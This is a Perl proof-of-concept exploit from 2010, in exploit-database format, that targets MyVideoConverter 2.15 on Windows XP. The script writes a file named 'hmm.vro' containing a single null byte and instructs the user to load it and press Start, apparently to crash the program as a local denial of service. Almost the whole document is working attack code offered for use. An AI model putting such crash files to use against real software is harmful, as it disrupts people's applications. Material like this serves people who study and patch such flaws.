# Exploit Title: MyVideoConverter Local DoS
# Date: April 5, 2010
# Software Link: [http://www.ivideogo.com/]
# Version: 2.15
# Tested on: Windows XP SP3
# Author: [anonymous]
#
#!/usr/bin/perl

my $file = "hmm.vro";
my $null = "\x00";

open (FILE, ">$file");
print FILE "$null";

print "Done. . . Add file -> click Start.\n"